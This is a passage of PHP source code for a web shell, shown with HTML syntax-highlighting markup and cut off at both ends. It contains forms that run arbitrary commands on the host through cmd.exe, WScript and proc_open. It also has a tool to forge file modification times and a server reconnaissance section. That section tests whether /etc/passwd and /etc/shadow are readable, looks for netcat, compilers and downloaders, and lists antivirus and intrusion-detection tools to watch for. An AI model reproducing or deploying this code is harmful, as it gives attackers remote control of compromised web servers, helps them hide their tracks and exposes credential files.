time'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','file');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dir',$nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('title'=&gt;'Alter folder/file','name'=&gt;'curfile','value'=&gt;$opf<span style=\"text-decoration: underline;\">ile,'size'=&gt;120,'newline'=&gt;1));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('title'=&gt;'Reference folder/file (fullpath)','name'=&gt;'tarfile<span style=\"text-decoration: underline;\">','size'=&gt;120,'newline'=&gt;1));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfooter();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('title'=&gt;'Set last modified'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','file');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dir',$nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('title'=&gt;'Current folder/file (fullpath)','name'=&gt;'curfile',<span style=\"text-decoration: underline;\">'value'=&gt;$opfile,'size'=&gt;120,'newline'=&gt;1));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;year:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'year','value'=&gt;date('Y',$opfilemtime),'size'=&gt;4));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('month:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'month','value'=&gt;date('m',$opfilemtime),'size'=&gt;2));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('day:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'day','value'=&gt;date('d',$opfilemtime),'size'=&gt;2));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('hour:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'hour','value'=&gt;date('H',$opfilemtime),'size'=&gt;2));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('minute:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'minute','value'=&gt;date('i',$opfilemtime),'size'=&gt;2))<span style=\"text-decoration: underline;\">;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('second:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'second','value'=&gt;date('s',$opfilemtime),'size'=&gt;2))<span style=\"text-decoration: underline;\">;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfooter();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   goback();\n}//end newtime\n\nelseif ($action == 'shell') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (IS_WIN &amp;&amp; IS_COM) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($program &amp;&amp; $parameter) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $shell= new COM('Shell.Application');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $a = $shell-&gt;ShellExecute($program,$parameter);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Program run has '.(!$a ? 'success' : 'fail'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$program &amp;&amp; $program = 'c:\\windows\\system32\\cmd.exe';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$parameter &amp;&amp; $parameter = '/c net start &gt; '.SA_ROOT.'log.txt';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('title'=&gt;'Execute Program'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','shell');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('title'=&gt;'Program','name'=&gt;'program','value'=&gt;$program,'<span style=\"text-decoration: underline;\">newline'=&gt;1));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('title'=&gt;'Parameter','name'=&gt;'parameter','value'=&gt;$param<span style=\"text-decoration: underline;\">eter));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'submit','class'=&gt;'bt','type'=&gt;'submit','value'=<span style=\"text-decoration: underline;\">&gt;'Execute'));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('title'=&gt;'Execute Command'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','shell');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (IS_WIN &amp;&amp; IS_COM) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $execfuncdb = array('phpfunc'=&gt;'phpfunc','wscript'=&gt;'wscript','proc_open<span style=\"text-decoration: underline;\">'=&gt;'proc_open');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeselect(array('title'=&gt;'Use:','name'=&gt;'execfunc','option'=&gt;$execfuncd<span style=\"text-decoration: underline;\">b,'selected'=&gt;$execfunc,'newline'=&gt;1));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('title'=&gt;'Command','name'=&gt;'command','value'=&gt;htmlspecialcha<span style=\"text-decoration: underline;\">rs($command)));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'submit','class'=&gt;'bt','type'=&gt;'submit','value'=&gt;'Ex<span style=\"text-decoration: underline;\">ecute'));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($command) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;hr width=\"100%\" noshade /&gt;&lt;pre&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($execfunc=='wscript' &amp;&amp; IS_WIN &amp;&amp; IS_COM) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $wsh = new COM('WScript.shell');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $exec = $wsh-&gt;exec('cmd.exe /c '.$command);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $stdout = $exec-&gt;StdOut();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $stroutput = $stdout-&gt;ReadAll();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo $stroutput;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif ($execfunc=='proc_open' &amp;&amp; IS_WIN &amp;&amp; IS_COM) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $descriptorspec = array(\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  0 =&gt; array('pipe', 'r'),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  1 =&gt; array('pipe', 'w'),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  2 =&gt; array('pipe', 'w')\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   );\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (is_resource($process)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fwrite($pipes[0], $command.\"\\r\\n\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fwrite($pipes[0], \"exit\\r\\n\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fclose($pipes[0]);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while (!feof($pipes[1])) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo fgets($pipes[1], 1024);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fclose($pipes[1]);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while (!feof($pipes[2])) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo fgets($pipes[2], 1024);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fclose($pipes[2]);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   proc_close($process);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo(execute($command));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/pre&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}//end shell\n\nelseif ($action == 'phpenv') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowe<span style=\"text-decoration: underline;\">d';</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getc<span style=\"text-decoration: underline;\">fg('sendmail_from');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$dis_func &amp;&amp; $dis_func = 'No';<span style=\"color: #f99157; background-color: #515151;\">     </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $info = array(\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   1 =&gt; array('Server Time',date('Y/m/d h:i:s',$timestamp)),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   2 =&gt; array('Server Domain',$_SERVER['SERVER_NAME']),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   3 =&gt; array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   4 =&gt; array('Server OS',PHP_OS),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   5 =&gt; array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   6 =&gt; array('Server Software',$_SERVER['SERVER_SOFTWARE']),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   7 =&gt; array('Server Web Port',$_SERVER['SERVER_PORT']),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   8 =&gt; array('PHP run mode',strtoupper(php_sapi_name())),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   9 =&gt; array('The file path',__FILE__),\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   10 =&gt; array('PHP Version',PHP_VERSION),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   11 =&gt; array('PHPINFO',(IS_PHPINFO ? '&lt;a href=\"javascript:g(\\'phpinfo\\');<span style=\"text-decoration: underline;\">\"&gt;Yes&lt;/a&gt;' : 'No')),</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   12 =&gt; array('Safe Mode',getcfg('safe_mode')),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   13 =&gt; array('Administrator',$adminmail),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   14 =&gt; array('allow_url_fopen',getcfg('allow_url_fopen')),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   15 =&gt; array('enable_dl',getcfg('enable_dl')),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   16 =&gt; array('display_errors',getcfg('display_errors')),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   17 =&gt; array('register_globals',getcfg('register_globals')),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   18 =&gt; array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   19 =&gt; array('memory_limit',getcfg('memory_limit')),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   20 =&gt; array('post_max_size',getcfg('post_max_size')),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   21 =&gt; array('upload_max_filesize',$upsize),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   22 =&gt; array('max_execution_time',getcfg('max_execution_time').' second(s<span style=\"text-decoration: underline;\">)'),</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   23 =&gt; array('disable_functions',$dis_func),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   );\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($phpvarname) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m($phpvarname .' : '.getcfg($phpvarname));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('title'=&gt;'Server environment'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','phpenv');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('title'=&gt;'Please input PHP configuration parameter(eg:magic_<span style=\"text-decoration: underline;\">quotes_gpc)','name'=&gt;'phpvarname','value'=&gt;$phpvarname,'newline'=&gt;1));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfooter();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $hp = array(0=&gt; 'Server', 1=&gt; 'PHP');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   for($a=0;$a&lt;2;$a++) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;'.$hp[$a].' &amp;raquo;&lt;/h2&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;ul class=\"info\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($a==0) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   for($i=1;$i&lt;=9;$i++) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif ($a == 1) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   for($i=10;$i&lt;=23;$i++) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;li&gt;&lt;u&gt;'.$info[$i][0].':&lt;/u&gt;'.$info[$i][1].'&lt;/li&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/ul&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}//end phpenv\n\nelseif ($action == 'secinfo') {\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Server software', @getenv('SERVER_SOFTWARE'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS[<span style=\"text-decoration: underline;\">'disable_functions']:'none');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Open base dir', @ini_get('open_basedir'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('cURL support', function_exists('curl_version')?'enabled':'no');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $temp=array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(function_exists('mysql_get_client_info'))\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $temp[] = \"MySql (\".mysql_get_client_info().\")\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(function_exists('mssql_connect'))\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $temp[] = \"MSSQL\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(function_exists('pg_connect'))\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $temp[] = \"PostgreSQL\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(function_exists('oci_connect'))\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $temp[] = \"Oracle\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Supported databases', implode(', ', $temp));\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if( !IS_WIN ) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $userful = array('gcc','lcc','cc','ld','make','php','perl','python','rub<span style=\"text-decoration: underline;\">y','tar','gzip','bzip','bzip2','nc','locate','suidperl');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd',<span style=\"text-decoration: underline;\">'rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mir<span style=\"text-decoration: underline;\">ror');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? \"yes\" : '<span style=\"text-decoration: underline;\">no');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? \"yes\" : '<span style=\"text-decoration: underline;\">no');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('OS version', @file_get_contents('/proc/version'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Distr name', @file_get_contents('/etc/issue.net'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $safe_mode = @ini_get('safe_mode');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(!$GLOBALS['safe_mode']) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $temp=array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach ($userful as $item)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(which($item)){$temp[]=$item;}\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: 